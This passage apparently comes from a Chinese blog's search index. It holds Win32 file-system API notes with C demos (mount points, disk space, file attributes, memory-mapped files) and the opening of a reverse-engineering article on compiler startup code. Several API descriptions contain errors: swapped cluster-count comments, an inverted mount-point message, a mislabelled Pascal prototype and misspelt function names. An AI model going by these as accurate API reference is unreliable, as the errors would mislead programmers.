0, &amp;dwVolumeSerialNumber, &amp;dwMaximumComponentLength, &amp;dwFileSystemFlags, szFileSystemNameBuffer, BUFSIZE )) { return FALSE; } printf(&quot;\\nVolume Serial Number is %u&quot;, dwVolumeSerialNumber); printf(&quot;\\nMaximum Component Length is %u&quot;, dwMaximumComponentLength); printf(&quot;\\nSystem Type is %s\\n&quot;, szFileSystemNameBuffer); if (dwFileSystemFlags &amp; FILE_SUPPORTS_REPARSE_POINTS) { printf(&quot;The file system does not support volume mount points.\\n&quot;); } if (dwFileSystemFlags &amp; FILE_VOLUME_QUOTAS) { printf(&quot;The file system supports disk quotas.\\n&quot;); } if (dwFileSystemFlags &amp; FILE_CASE_SENSITIVE_SEARCH) { printf(&quot;The file system supports case-sensitive file names.\\n&quot;); } //you can use these value to get more informaion // //FILE_CASE_PRESERVED_NAMES //FILE_CASE_SENSITIVE_SEARCH //FILE_FILE_COMPRESSION //FILE_NAMED_STREAMS //FILE_PERSISTENT_ACLS //FILE_READ_ONLY_VOLUME //FILE_SUPPORTS_ENCRYPTION //FILE_SUPPORTS_OBJECT_IDS //FILE_SUPPORTS_REPARSE_POINTS //FILE_SUPPORTS_SPARSE_FILES //FILE_UNICODE_ON_DISK //FILE_VOLUME_IS_COMPRESSED //FILE_VOLUME_QUOTAS printf(&quot;...\\n&quot;); return TRUE;} 操作驱动器挂载点驱动器挂载点，又可以被称为卷挂载点。挂载点实际上是操作系统用户设置的。用来进入一个逻辑驱动器或者卷的入口。 一般可以使用FindFirstVolumeMountPoint系统的API来找到一个卷的所有挂载点；用GetVolumeNameForVolumeMountPonit来获取挂载点所指向的卷名。 关键APIFindFirstVolumeMountPoint获取指定卷的第一个挂载点，函数原型如下： 12345HANDLE FindFirstVolumeMountPoint( LPTSTR lpszRootPathName, //输入参数，指定要查找的卷名，以反斜杠结尾 LPTSTR lpszVolumeMountPoint, //输出参数，找到第一个挂载点 DOWRD cchBufferLength //输入参数，用来存储输出挂载点的缓冲的大小); 返回值为HANDLE值，为一个查找句柄，FindFirstVolumeMountPoint用该句柄查找下一个挂载点。 FindNextVolumeMountPoint12345BOOL FindNextVolumeMountPoint( HANDLE hFindVolumeMountPoint, //输出参数，查找句柄，由FindFirstVolumeMountPoint获取 LPTSTR lpszVolumeMountPoint, //输出参数，找到的后续挂载点 DWORD cchBufferLength //输入参数，用来存储输出挂载点的缓冲的大小) 返回值为BOOL值，表示查找是否成，失败并且GetLastError函数返回。 FindVolumeMountPointClose123BOOL FindVolumeMountPointClose( HANDLE hFindVolumeMountPoint //要关闭的挂载点查找句柄); 返回的BOOL值表示是否成功关闭句柄 GetVolumeNameForVolumeMountPoint根据指定的关在点获取相应的卷设备名 12345BOOL GetVolumeNameForVolumeMountPoint( LPCTSTR lpszVolumeMountPoint, //输入参数，指定需要查找挂载点或根目录，反斜杠结束 LPTSTR lpszVolumeName, //输出参数，挂载点对应的卷设备名 DOWRD cchBufferLength //输入参数，用来存储输出设备名的缓存大小); 返回BOOL值，表示函数是否成功，使用GetLastError函数获取详细错误 SetVolumeMountPoint将指定卷挂在到执行挂载点 12345BOOL SetVolumeMountPoint( LPCTSTR lpszVolumeMountPoint, //输入参数，指定的挂载点，挂载点必须为一个根路径或现在有的路径上，必须以反斜杠结束 LPCTSTR lpszVolumeName //输入参数，卷设备名); 返回BOOL值表示函数是否成功 判断光驱中是否有光盘关键APIGetDiskType获取逻辑驱动器信息，函数原型如下： 12345678910BOOL GetVolumeInformation( lpRootPathName: PChar; {磁盘驱动器代码字符串} lpVolumeNameBuffer: PChar; {磁盘驱动器卷标名称} nVolumeNameSize: DWORD; {磁盘驱动器卷标名称长度} lpVolumeSerialNumber: PDWORD; {磁盘驱动器卷标序列号} var lpMaximumComponentLength: DWORD; {系统允许的最大文件名长度} var lpFileSystemFlags: DWORD; {文件系统标识} lpFileSystemNameBuffer: PChar; {文件操作系统名称} nFileSystemNameSize: DWORD {文件操作系统名称长度}); 返回BOOL，表示信息是否获取成功。 GetLastError获取在执行本线程中最近的一次错误 123DOWRD GetLastError( VOID) 返回值类型为DWORD，表示本线程的LastError值 获取磁盘分区容量、空间容量、簇、扇区信息关键APIGetDiskFreeSpace获取驱动器根路径作为输入，获取磁盘信息空间，包括每簇的扇区数、每扇区字节数、簇数量、空闲的簇数量，函数原型如下： 1234567BOOL GetDiskFreeSpace( LPCTSTR lpRootPathName, //要查询的逻辑磁盘根路径，如&quot;C:\\&quot;，传入NULL表示程序当前磁盘 LPDWORD lpSectorsPerCluster, //磁盘一个簇内的扇区数 LPDWORD lpBytesPerSector, //磁盘一个扇区内的字节数 LPDWORD lpNumberOfFreeClusters, //磁盘总簇数 LPDWORD lpTotalNumberOfClusters //磁盘的剩余簇数 ) 返回BOOL值，表示信息是否获取成功 GetDiskFreeSpaceEx123456BOOL GetDiskFreeSpaceExA( LPCSTR lpDirectoryName, //指向所要获取磁盘空间信息的磁盘分区根路径字符串 PULARGE_INTEGER lpFreeBytesAvailableToCaller, //指向用于存储可获得的总字节数量的变量 PULARGE_INTEGER lpTotalNumberOfBytes, //指向存储磁盘空间总字节数据的变量 PULARGE_INTEGER lpTotalNumberOfFreeBytes //指向存储磁盘空闲空间总字节的变量); 返回BOOL值，表示信息是否成功 文件和目录管理删除、复制、重命名、移动文件关键APIDeleteFileDelete的功能是删除文件。以文件决定路径作为参数。 123BOOL DeleteFile( LPCTSTR lpFileName //表示删除文件的相对路径或绝对路径); BOOL返回值，表示文件删除是否成功。 CopyFileCopyFile的功能是复制文件。通过参数输入复制文件和原路径和目的路径。 12345BOOL CopyFile( LPCTSTR lpExistingFineName, //已经存在的所需复制文件的原路径 LPCTSTR lpNewFileName, //新文件路径，复制文件的目的路径 BOOL bFailIfEsists //指明如果在目的路径存在文件时是否覆盖); 返回值BOOL，表示文件是否复制成功 MoveFileMoviFile的功能是移动、重命名文件和目录。 1234BOOL MoveFile( LPCTSTR lpExistingFileName, //为已经存在的所需移动文件的原路径 LPCTSTR lpNewFileName //新文件路径，移动文件的目的路径); 创建、打开、读写文件、获取文件大小在文件操作中，文件句柄是一个关键的概念。文件句柄唯一标识了一个文件。关键函数是使用文件句柄来作为参数来标识。对文件操作进行前，都必须使用CreateFile获得文件句柄。 关键APICreateFile123456789HANDLE CreateFile( LPCTSTR lpFileName, //操作对象文件的相对路径或绝对路径 DWORD dwDesiredAccess, //指明对文件的操作存取方式 DWORD dwShareMode, //共享模式 LPSECURITY_ATTRIBUTES lpSecurityAttributes, //安全属性 DWORD dwCreationDisposition, //操作模式 DWORD dwFlagsAndAttributes, //文件属性和文件标志 HANDLE hTemplateFile //一般情况为null); 返回HANDLE数据类型值，标识文件的句柄。 ReadFileReadFile是从文件中读出数据 1234567BOOL ReadFile( HANDLE hFile, //读取数据的文件对象 LPVOID lpBuffer, //指向文件读取存储的内存缓冲区 DWORD nNumberOfBytesToRead, //指明需要从文件中读取的数据大小 LPDWORD lpNumberOfBytesRead, //指向存储实际独处的数据大小的DWORD变量 LPOVERLAPPED lpOverlapped //如果CreateFile调用的时候设置了FILE_FLAG_OVERLAPPED标志，则需要使用该参数，否则可以设置为null); WriteFileWriteFile函数的宫鞥是将数据写入到文件中，写入到文件指针所在位置。 1234567BOOL WriteFile( HANDLE hFile, //写入数据的文件对象 LPCVOID lpBuffer, //指明需要写入文件数据存储的内存缓冲区 DWORD nNumberOfBytesToWrite, //指明需要写入的文件中的数据大小 LPDWORD lpNumberOfBytesWritten, //指向存储真实写入的数据大小的变量 LPOVERLAPPED lpOverlapped //如果CreateFile调用的时候设置了FILE_FLAG_OVERLAPPED标志，则需要使用该参数，可以为NULL); GetFileSize、GetFileSizeEx123456789DWORD GetFileSize( HANDLE hFile, LPDWORD lpFileSizeHigh);BOOL GetFileSizeEx( HANDLE hFile, //读取数据的文件对象 PLARGE_INTEGER lpFileSize //指向存储文件大小的一个LARGE_IMTEGER联合体); GetFileSize成功时，返回值为一个标识文件大小DWORD值。 创建目录关键APICreateDirectory1234BOOL CreateDirectory( LPCTSTR lpPathName, //索要创建的目录名或路径 LPSECURITY_ATTRIBUTES lpSecurityAttributes //设置为null); Demo 12345678910111213141516171819202122232425262728293031/* 头文件 */#include &lt;windows.h&gt;#include &lt;stdio.h&gt;/* ************************************* int main(void)* 功能 演示使用CreateDirectory创建目录**************************************/int main(void){ //在程序的当前目录下创建“sub_dir”子目录 LPSTR szDirPath = &quot;sub_dir&quot;; if (!CreateDirectory(szDirPath, NULL)) { printf(&quot;创建目录 %s 错误。\\n&quot;, szDirPath); return 1; } //在F盘下创建目录“example_dir” szDirPath = &quot;F:\\\\example_dir&quot;; if (!CreateDirectory(szDirPath, NULL)) { printf(&quot;创建目录 %s 错误。\\n&quot;, szDirPath); return 1; } printf(&quot;成功\\n&quot;); return 0;} 获取程序所在目录、程序模块路径、获取和设置当前目录Windows系统提供了GetCurrentDirectory和SetCurrentDirectory获取程序的当前目录，GetModuleFileName获取模块的路径。 关键APIGetCurrentDirectory获取进程的当前目录，函数原型如下； 1234DWORD GetCurrentDirectory( DWORD nBufferLength, //存储路径字符串缓冲区大小 LPTSTR lpBuffer //获取的路径字符串) 返回DWORD值，如果为0，标识运行失败，如果非0，获取的是路径字符串长度，函数成功 SetCurrentDirectory123BOOL SetCurrentDirectory( LPCTSTR lpPathName //需要设置的路径值) 返回结果为0，标识执行失败，非0则成功 GetModuleFileName12345WINAPI DWORD GetModuleFileName( HMODULE hModule, //所要获取模块路径的模块句柄 LPWSTR lpFilename, //模块的全路径 DWORD nSize //lpFileName所指向的缓冲区大小); 可以使用GetLastError获取错误信息，如果返回值为nSize所指向大小，那么可能是缓冲区大小 查找文件、遍历指定目录下的文件和子目录Win32用于遍历目录，它们是FindFirstFile函数、FindNextFile函数和WIN32_FIND_DATA结构。 关键APIFindFirstFile1234HANDLE FindFirstFile( LPCTSTR lpFileName, //查找的目录，需使用通配符指定查找的文件目标 LPWIN32_FIND_DATA lpFindFileData //指向WIN32_FIND_DATA结构的指针，为找到的文件及若其干属性信息) 返回HANDLE值，如果执行失败，返回INVALID_HANDLE_VALUE，如果成功则返回查找句柄。 FindNextFile1234BOOL FindNextFile( HANDLE hFindFile, //查找句柄，由FindFirstFile返回 LPWIN32_FIND_DATA lpFindFileData //指向WIN32_FIND_DATA结构的指针，为找到的文件及若其干属性信息); 返沪BOOL值，标识是否成功 WIN32_FIND_DATAWIN32_FIND_DATA结构用于表示找到的文件，结构中包含文字、目录的名字，创建、最后访问和最后写入的时间，文件大小、文件属性等。 123456789101112131415typedef struct _WIN32_FIND_DATAA { DWORD dwFileAttributes; FILETIME ftCreationTime; FILETIME ftLastAccessTime; FILETIME ftLastWriteTime; DWORD nFileSizeHigh; DWORD nFileSizeLow; DWORD dwReserved0; DWORD dwReserved1; CHAR cFileName[MAX_PATH]; CHAR cAlternateFileName[14]; DWORD dwFileType; DWORD dwCreatorType; WORD wFinderFlags;} WIN32_FIND_DATAA, *PWIN32_FIND_DATAA, *LPWIN32_FIND_DATAA; 递归遍历目录树123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596/* 头文件 */#include &lt;windows.h&gt;#include &lt;stdio.h&gt;/* 预处理申明 */#pragma comment (lib, &quot;User32.lib&quot;)/* 函数申明 */DWORD ListAllFileInDrectory(LPSTR szPath);/* 全局变量 *///记录所有的文件和目录数DWORD dwTotalFileNum = 0;/* ************************************* DWORD ListAllFileInDrectory(LPSTR szPath)* 功能 遍历目录及所有子目录，打印路径** 参数 LPTSTR szPath，为需遍历的目录** 返回值 0代表执行完成，1代码发生错误**************************************/DWORD ListAllFileInDrectory(LPSTR szPath){ CHAR szFilePath[MAX_PATH]; WIN32_FIND_DATA FindFileData; HANDLE hListFile; CHAR szFullPath[MAX_PATH]; //构造代表子目录和文件夹路径的字符串，使用通配符“*” lstrcpy(szFilePath, szPath); lstrcat(szFilePath, &quot;\\\\*&quot;); //查找第一个文件/目录，获得查找句柄 hListFile = FindFirstFile(szFilePath,&amp;FindFileData); if(hListFile==INVALID_HANDLE_VALUE) { printf(&quot;错误：%d&quot;,GetLastError()); return 1; } else { do { // 过滤“.”和“..”，不需要遍历 if(lstrcmp(FindFileData.cFileName,TEXT(&quot;.&quot;))==0|| lstrcmp(FindFileData.cFileName,TEXT(&quot;..&quot;))==0) { continue; } //构造成全路径 wsprintf(szFullPath,&quot;%s\\\\%s&quot;, szPath,FindFileData.cFileName); dwTotalFileNum++; //打印 printf(&quot;\\n%d\\t%s\\t&quot;,dwTotalFileNum,szFullPath); //如果是目录，则递归调用，列举下级目录 if(FindFileData.dwFileAttributes&amp;FILE_ATTRIBUTE_DIRECTORY) { printf(&quot;&lt;DIR&gt;&quot;); ListAllFileInDrectory(szFullPath); } } while(FindNextFile(hListFile, &amp;FindFileData)); } return 0;}/* ************************************* int main(int argc, PCHAR argv[])* 功能 调用ListAllFileInDrectory* 遍历目录下的文件和子目录** 参数 argv[1]为需遍历的路径，如果为空则获取* 当前路径****************************************/int main(int argc, PCHAR argv[]){ if(argc == 2) { ListAllFileInDrectory(argv[1]); } else { CHAR szCurrentPath[MAX_PATH]; GetCurrentDirectory(MAX_PATH,szCurrentPath); ListAllFileInDrectory(szCurrentPath); } return 0;} 获取、设置文件属性和时间为了获取文件属性，用户可以使用GetFileAttributes与GetFileAttributesEx函数； 关键APIGetFileAttributes获取文件或目录的属性； 123DWORD GetFileAttributes( LPCTSTR lpFileName //为需要获取属性的文件或目录) 返回DWORD值，表示文件属性 GetFileAttributesEx12345BOOL GetFileAttributesEx( LPCTSTR lpFileName, //为需要获取属性的文件或目录 GET_FILEEX_INFO_LEVELS fInfoLevelId, //获取文件属性信息的类别 LPVOID lpFileInformation //用于返回结构); 返回BOOL值，是否成功 SetFileAttributes设置文件或目录的属性 1234BOOL SetFileAttributes( LPCTSTR lpFileName, //为需要设置属性的目录或文件 DWORD dwFileAttributes //文件属性值) 返回BOOL值，表示是否成功 FileTimeToLocalFileTime把文件时间转换为本地的文件时间 1234BOOL FileTimeToLocalFileTime( const FILETIME *lpFileTime, //为需要转换的文件时间 LPFILETIME lpLocalFileTime //为指向转换后的文件时间); FileTimeToSystemTime将文件时间转换为系统时间(SYSTEMTIME格式) 1234BOOL FileTimeToSystemTime( const FILETIME *lpFileTime, //指向需要转换的文件时间 LPSYSTEMTIME lpSystemTime //指向转换后的SYSTEMTIME); 关键数据结构SYSTEMTIME12345678910typedef struct _SYSTEMTIME { WORD wYear; WORD wMonth; WORD wDayOfWeek; WORD wDay; WORD wHour; WORD wMinute; WORD wSecond; WORD wMilliseconds;} SYSTEMTIME, *PSYSTEMTIME, *LPSYSTEMTIME; WIN32_FILE_ATTRIBUTES_DATA12345678typedef struct _WIN32_FILE_ATTRIBUTE_DATA { DWORD dwFileAttributes; FILETIME ftCreationTime; FILETIME ftLastAccessTime; FILETIME ftLastWriteTime; DWORD nFileSizeHigh; DWORD nFileSizeLow;} WIN32_FILE_ATTRIBUTE_DATA, *LPWIN32_FILE_ATTRIBUTE_DATA; FILETIME1234typedef struct _FILETIME { DWORD dwLowDateTime; DWORD dwHighDateTime;} FILETIME, *PFILETIME, *LPFILETIME; Demo123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190/* 头文件 */#include &lt;windows.h&gt;#include &lt;stdio.h&gt;/* 函数申明 */DWORD ShowFileTime(PFILETIME lptime);DWORD ShowFileSize(DWORD dwFileSizeHigh, DWORD dwFileSizeLow);DWORD ShowFileAttrInfo(DWORD dwAttribute);DWORD SetFileHiddenAndReadonly(LPSTR szFileName);/* ************************************* DWORD ShowFileAttributes(LPSTR szPath)* 功能 获取并显示文件属性，* 调用ShowFileTime、ShowFileSize和* ShowFileAttrInfo函数** 参数 LPTSTR szPath，获取并显示此文件的属性** 返回值 0代表执行完成，1代码发生错误**************************************/DWORD ShowFileAttributes(LPSTR szPath){ //文件属性结构 WIN32_FILE_ATTRIBUTE_DATA wfad; printf(&quot;文件：%s\\n&quot;, szPath); //获取文件属性 if (!GetFileAttributesEx(szPath, GetFileExInfoStandard, &amp;wfad)) { printf(&quot;获取文件属性错误：%d\\n&quot;, GetLastError()); return 1; } //显示相关时间 printf(&quot;创建时间：\\t&quot;); ShowFileTime(&amp;(wfad.ftCreationTime)); printf(&quot;最后访问时间：\\t&quot;); ShowFileTime(&amp;(wfad.ftLastAccessTime)); printf(&quot;最后修改时间：\\t&quot;); ShowFileTime(&amp;(wfad.ftLastWriteTime)); //显示文件大小 ShowFileSize(wfad.nFileSizeHigh, wfad.nFileSizeLow); //显示文件属性 ShowFileAttrInfo(wfad.dwFileAttributes); return 0;}/* ************************************* DWORD ShowFileAttrInfo(DWORD dwAttribute)* 功能 打印将文件属性** 参数 DWORD dwAttribute，文件属性** 返回值 0**************************************/DWORD ShowFileAttrInfo(DWORD dwAttribute){ //依次判断属性，并显示。 printf(&quot;文件属性：\\t&quot;); if (dwAttribute&amp;FILE_ATTRIBUTE_ARCHIVE) printf(&quot;&lt;ARCHIVE&gt; &quot;); if (dwAttribute&amp;FILE_ATTRIBUTE_COMPRESSED) printf(&quot;&lt;压缩&gt; &quot;); if (dwAttribute&amp;FILE_ATTRIBUTE_DIRECTORY) printf(&quot;&lt;目录&gt; &quot;); if (dwAttribute&amp;FILE_ATTRIBUTE_ENCRYPTED) printf(&quot;&lt;加密&gt; &quot;); if (dwAttribute&amp;FILE_ATTRIBUTE_HIDDEN) printf(&quot;&lt;隐藏&gt; &quot;); if (dwAttribute&amp;FILE_ATTRIBUTE_NORMAL) printf(&quot;&lt;NORMAL&gt; &quot;); if (dwAttribute&amp;FILE_ATTRIBUTE_OFFLINE) printf(&quot;&lt;OFFLINE&gt; &quot;); if (dwAttribute&amp;FILE_ATTRIBUTE_READONLY) printf(&quot;&lt;只读&gt; &quot;); if (dwAttribute&amp;FILE_ATTRIBUTE_SPARSE_FILE) printf(&quot;&lt;SPARSE&gt; &quot;); if (dwAttribute&amp;FILE_ATTRIBUTE_SYSTEM) printf(&quot;&lt;系统文件&gt; &quot;); if (dwAttribute&amp;FILE_ATTRIBUTE_TEMPORARY) printf(&quot;&lt;临时文件&gt; &quot;); printf(&quot;\\n&quot;); return 0;}/* ************************************* DWORD ShowFileSize(DWORD dwFileSizeHigh, DWORD dwFileSizeLow)* 功能 打印文件大小信息** 参数 DWORD dwFileSizeHigh，文件大小高32位* DWORD dwFileSizeLow，文件大小低32位** 返回值 0**************************************/DWORD ShowFileSize(DWORD dwFileSizeHigh, DWORD dwFileSizeLow){ ULONGLONG liFileSize; liFileSize = dwFileSizeHigh; //高们移动32位 liFileSize &lt;&lt;= sizeof(DWORD) * 8; liFileSize += dwFileSizeLow; printf(&quot;文件大小：\\t%I64u 字节\\n&quot;, liFileSize); return 0;}/* *************************************DWORD ShowFileTime(PFILETIME lptime)* 功能 轮换文件时间，将打印** 参数 PFILETIME lptime，指向文件时间的指针** 返回值 0**************************************/DWORD ShowFileTime(PFILETIME lptime){ //文件时间结构 FILETIME ftLocal; //系统时间结构 SYSTEMTIME st; //调整为系统所在时区的时间 FileTimeToLocalFileTime( lptime, &amp;ftLocal ); //将文件时间转换为SYSTEMTIME格式，便于显示。 FileTimeToSystemTime( &amp;ftLocal, &amp;st ); //显示时间信息字符串 printf(&quot;%4d年%.2d月%#02d日，%.2d:%.2d:%.2d\\n&quot;, st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond); return 0;}/* ************************************* DWORD SetFileHiddenAndReadonly(LPSTR szFileName)* 功能 将指定的文件设置为隐藏和只读** 参数 LPSTR szFileName，文件路径** 返回值 0**************************************/DWORD SetFileHiddenAndReadonly(LPSTR szFileName){ //获取原来的文件属性 DWORD dwFileAttributes = GetFileAttributes(szFileName); //将只读和隐藏属性附加到原来的文件属性上 dwFileAttributes |= FILE_ATTRIBUTE_READONLY; dwFileAttributes |= FILE_ATTRIBUTE_HIDDEN; //设置文件属性，并判断是否成功。 if (SetFileAttributes(szFileName, dwFileAttributes)) { printf(&quot;文件%s的隐藏和属性设置成功\\n&quot;, szFileName); } else { printf(&quot;属性设置; %d\\n&quot;, GetLastError()); } return 0;}/* ************************************* int main(int argc, PCHAR argv[])* 功能 设置和获取文件属性等** 参数 显示第一个参数指定文件的属性、时间、大小* 将第二个参数的属性设置为隐藏、只读。** 返回值 0代表执行完成，1代码发生错误**************************************/int main(int argc, PCHAR argv[]){ if (argc != 3) { printf(&quot;请输入参数\\n&quot;); printf(&quot;显示第一个参数指定文件的属性、时间、大小；\\n&quot;); printf(&quot;将第二个参数的属性设置为隐藏、只读。&quot;); return 1; } ShowFileAttributes(argv[1]); SetFileHiddenAndReadonly(argv[2]); return 0;} 内存映射文件使用Mapping File提高文件读写效率 使用Mapping File在进程间共享内存 通过文件句柄获得文件路径 使用CreateFileMapping提高文件读写效率文件映射是一种在将文件内容映射到进程的虚拟地址空间的技术。 关键APIGetSystemInfo 123void GetSystemInfo( LPSYSTEM_INFO lpSystemInfo); CreateFileMapping12345678HANDLE CreateFileMappingA( HANDLE hFile, //由CreateFile创建需要映射的文件 LPSECURITY_ATTRIBUTES lpFileMappingAttributes, //安全结构体 DWORD flProtect, //内存保护属性 DWORD dwMaximumSizeHigh, //映射大小的最大值的高32位 DWORD dwMaximumSizeLow, //映射大小的最大值的低32位 LPCSTR lpName //映射对象名); 返回一个HANDLE值，mapping对象的句柄。如果返回NULL，则表示失败了。 MapViewOfFile1234567LPVOID MapViewOfFile( HANDLE hFileMappingObject, //文件mapping对象的句柄。由CreateFileMapping函数或OpenFileMapping函数返回 DWORD dwDesiredAccess, //存取类别 DWORD dwFileOffsetHigh, //映射大小的最大值的高32位 DWORD dwFileOffsetLow, //映射大小的最大值的低32位 SIZE_T dwNumberOfBytesToMap //映射到View的字节数); 返回LPVOID值，指向映射的内存值，如果未NULL表示报错 FlushViewOfFile1234BOOL FlushViewOfFile( LPCVOID lpBaseAddress, //需要写入至文件的数据的起始位置 SIZE_T dwNumberOfBytesToFlush //写入的字节数，如果为0则将整个视图写入); 如果不使用此函数，数据最终也会写到磁盘，调用此函数，数据立即回写到磁盘 FileMemory、Copymemory123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141/* 头文件 */#include &lt;windows.h&gt;#include &lt;stdio.h&gt;/* 预处理申明 */#define BUFFSIZE 1024 // 内存大小#define FILE_MAP_START 0x28804 // 文件映射的起始的位置/* 全局变量 */LPTSTR lpcTheFile = TEXT(&quot;123.dat&quot;); // 文件名/* ************************************* int main(void)* 功能 演示使用文件mapping** 参数 无** 返回值 0代表执行完成，1代表发生错误**************************************/int main(void){ HANDLE hMapFile; // 文件内存映射区域的句柄 HANDLE hFile; // 文件的句柄 DWORD dBytesWritten; // 写入的字节数 DWORD dwFileSize; // 文件大小 DWORD dwFileMapSize; // 文件映射的大小 DWORD dwMapViewSize; // 视图（View）的大小 DWORD dwFileMapStart; // 文件映射视图的起始位置 DWORD dwSysGran; // 系统内存分配的粒度 SYSTEM_INFO SysInfo; // 系统信息 LPVOID lpMapAddress; // 内在映射区域的起始位置 PCHAR pData; // 数据 INT i; // 循环变量 INT iData; INT iViewDelta; BYTE cMapBuffer[32]; // 存储从mapping中计出的数据 // 创建一个文件 hFile = CreateFile(lpcTheFile, GENERIC_READ | GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL); //判断文件是否创建成功 if (hFile == INVALID_HANDLE_VALUE) { printf(&quot;CreateFile error\\n&quot;, GetLastError); return 1; } // 依次写入整数，一共写入65535个整数 // 在32位平台下，大小为65535*32 for (i = 0; i&lt;65535; i++) { WriteFile(hFile, &amp;i, sizeof(i), &amp;dBytesWritten, NULL); } // 查看写入完成后的文件大小 dwFileSize = GetFileSize(hFile, NULL); printf(&quot;文件大小: %d\\n&quot;, dwFileSize); //获取系统信息，内存分配粒度 //获取分配粒度，进行下面的几个计算， //目的是为了映射的数据与系统内存分配粒度对齐，提高内存访问效率 GetSystemInfo(&amp;SysInfo); dwSysGran = SysInfo.dwAllocationGranularity; //计算mapping的起始位置 dwFileMapStart = (FILE_MAP_START / dwSysGran) * dwSysGran; // 计算mapping view的大小 dwMapViewSize = (FILE_MAP_START % dwSysGran) + BUFFSIZE; // 计算mapping的大小 dwFileMapSize = FILE_MAP_START + BUFFSIZE; // 计算需要读取的数据的偏移 iViewDelta = FILE_MAP_START - dwFileMapStart; // 创建File mapping hMapFile = CreateFileMapping(hFile, // 需要映射的文件的句柄 NULL, // 安全选项：默认 PAGE_READWRITE, // 可读，可写 0, // mapping对象的大小，高位 dwFileMapSize, // mapping对象的大小，低位 NULL); // mapping对象的名字 if (hMapFile == NULL) { printf(&quot;CreateFileMapping error: %d\\n&quot;, GetLastError()); return 1; } // 映射view lpMapAddress = MapViewOfFile(hMapFile, // mapping对象的句柄 FILE_MAP_ALL_ACCESS, // 可读，可写 0, // 映射的文件偏移，高32位 dwFileMapStart, // 映射的文件偏移，低32位 dwMapViewSize); // 映射到View的数据大小 if (lpMapAddress == NULL) { printf(&quot;MapViewOfFile error: %d\\n&quot;, GetLastError()); return 1; } printf(&quot;文件map view相对于文件的起始位置： 0x%x\\n&quot;, dwFileMapStart); printf(&quot;文件map view的大小：0x%x\\n&quot;, dwMapViewSize); printf(&quot;文件mapping对象的大小：0x%x\\n&quot;, dwFileMapSize); printf(&quot;从相对于map view 0x%x 字节的位置读取数据，&quot;, iViewDelta); // 将指向数据的指针偏移，到达我们关心的地方 pData = (PCHAR)lpMapAddress + iViewDelta; // 读取数据，赋值给变量 iData = *(PINT)pData; // 显示读取的数据 printf(&quot;为：0x%.8x\\n&quot;, iData); // 从mapping中复制数据，32个字节，并打印 CopyMemory(cMapBuffer, lpMapAddress, 32); printf(&quot;lpMapAddress起始的32字节是：&quot;); for (i = 0; i&lt;32; i++) { printf(&quot;0x%.2x &quot;, cMapBuffer[i]); } // 将mapping的前32个字节用0xff填充 FillMemory(lpMapAddress, 32, (BYTE)0xff); // 将映射的数据写回到硬盘上 FlushViewOfFile(lpMapAddress, dwMapViewSize); printf(&quot;\\n已经将lpMapAddress开始的32字节使用0xff填充。\\n&quot;); // 关闭mapping对象 if (!CloseHandle(hMapFile)) { printf(&quot;\\nclosing the mapping object error %d!&quot;, GetLastError()); } //关闭文件 if (!CloseHandle(hFile)) { printf(&quot;\\nError %ld occurred closing the file!&quot;, GetLastError()); } return 0;} 通过MappingFile在进程间传递和共享数据关键APIOpenFileMapping打开已经存在的命名的文件映射，函数原型： 12345HANDLE OpenFileMappingA( DWORD dwDesiredAccess, //mapping对象的存根权限 BOOL bInheritHandle, //如果为True，则可能继承进程句柄，否则不能继承 LPCSTR lpName //打开的对象，mapping对象的名字); UnmapViewOfFile123BOOL UnmapViewOfFile( LPCVOID lpBaseAddress //取消映射的内存地址); 通过文件句柄获得文件路径QueryDosDrvice这个函数可以将驱动器的根路径转换为设备名，然后循环比较，得到文件路径 关键APIGetMappedFileName123456DWORD GetMappedFileNameA( HANDLE hProcess, //映射对象所属进程 LPVOID lpv, //映射视图的地址 LPSTR lpFilename, //文件路径缓冲区指针 DWORD nSize //内存区域大小，防止溢出); QueryDosDrvice12345DWORD QueryDosDrvice( LPCTSTR lpDeviceName, //ms-Dos设备名字符串 LPTSTR lpTargetPath, //存储返回结果的缓冲区地址 DWORD ucchMax //缓冲区大小)","link":"/2019/11/29/Windows%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F-%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F/"},{"title":"加密与解密-逆向分析技术","text":"将可执行程序反汇编，通过分析反汇编代码来理解其代码功能，然后用高级语言重新描述这段代码，逆向分析原始原始软件思路，这个过程就称为逆向工程。 32位软件逆向技术启动函数在编写Win32的项目中，都必须在源码中实现一个WinMain函数，但Windows不是从WinMain函数开始的。首先被执行的是启动函数的相关代码，这段代码是由编译器生成的。在启动代码初始化进程完成后，才会调用WinMain函数。 12GetStartupInfo (&amp;StartupInfo);Int nMainRetVal = WinMain(GetModuleHandle(NULL),NULL,pszCommandLineAnsi,StartupInfo.wShowWindow:SW__SHOWDEFAULT); 进入入口点时，启动函数便用C运行库的exit函数，将返回值(nMainRetVal)传递给它，进行一些必要的处理，最后调用系统函数ExitProcess退出。 12345678910111213141516171819202122232425262728293031.text:00401180 push ebp.text:00401181 mov ebp, esp.text:00401183 push 0FFFFFFFFh.text:00401185 push offset stru_4040D0.text:0040118A push offset __except_handler3.text:0040118F mov eax, large fs:0.text:00401195 push eax.text:00401196 mov large fs:0, esp.text:0040119D sub esp, 58h.text:004011A0 push ebx.text:004011A1 push esi.text:004011A2 push edi.text:004011A3 mov [ebp+ms_exc.old_esp], esp.text:004011A6 call ds:GetVersion ;确定Windows版本.......text:004011F4 call ds:GetCommandLineA ;指向进程的完整命令行指针.......text:0040121E push eax ; 获取进程启动信息.......text:00401241 push esi ; lpModuleName.text:00401242 call ds:GetModuleHandleA ;返回进程地址空间执行文件.text:00401248 push eax ; hInstance.text:00401249 call _WinMain@16 ; 调用用户编写的进入点函数WinMain.......text:0040124E mov [ebp+var_60], eax ;.text:00401251 push eax ; int.text:00401252 call _exit ;退出程序.......text:0040124E mov [ebp+var_60], eax.text:00401251 push eax ; int.text:00401252 call _exit 